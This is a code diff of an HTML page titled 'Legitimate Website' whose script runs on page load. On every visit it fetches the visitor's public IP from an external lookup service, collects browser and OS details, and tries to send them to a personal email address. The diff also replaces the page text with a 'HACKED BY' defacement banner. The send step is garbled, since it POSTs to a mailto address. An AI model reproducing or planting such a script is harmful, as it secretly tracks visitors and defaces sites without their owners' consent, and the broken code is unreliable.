@@ -1,11 +1,16 @@
-<html> <head> <title>Legitimate Website</title> <script> function sendData() { const ip = "IP not specified"; const browserName = navigator.appName; const browserVersion = navigator.appVersion; const os = navigator.platform;
-
-const recipient = "austintaleno82@gmail.com";
-const subject = "Browser Info";
-const body = `IP: ${ip}\nBrowser Name: ${browserName}\nBrowser Version: ${browserVersion}\nOS: ${os}`;
-
-window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
+<html> <head> <title>Legitimate Website</title> <script> function sendData() { // Get user's IP address fetch('https://api.ipify.org/') .then(response => response.text()) .then(ip => { const browserName = navigator.appName; const browserVersion = navigator.appVersion; const os = navigator.platform;
+    const recipient = "austintaleno82@gmail.com";
+      const subject = "Browser Info";
+      
+      const body = `IP: ${ip}\nBrowser Name: ${browserName}\nBrowser Version: ${browserVersion}\nOS: ${os}`;
+      
+      const xhttp = new XMLHttpRequest();
+      xhttp.open("POST", "mailto:" + recipient, true);
+      xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      
+      xhttp.send("subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body));
+    });
 }
 sendData();
 
-</script> </head> <body> <h1>Welcome to Our Website</h1> <p>Feel free to browse our exclusive content.</p> </body> </html>
+</script> </head> <body> <h1>HACKED BY @YourAnonOne</h1> <p>Hey kid this is a prank happy day.</p> </body> </html>
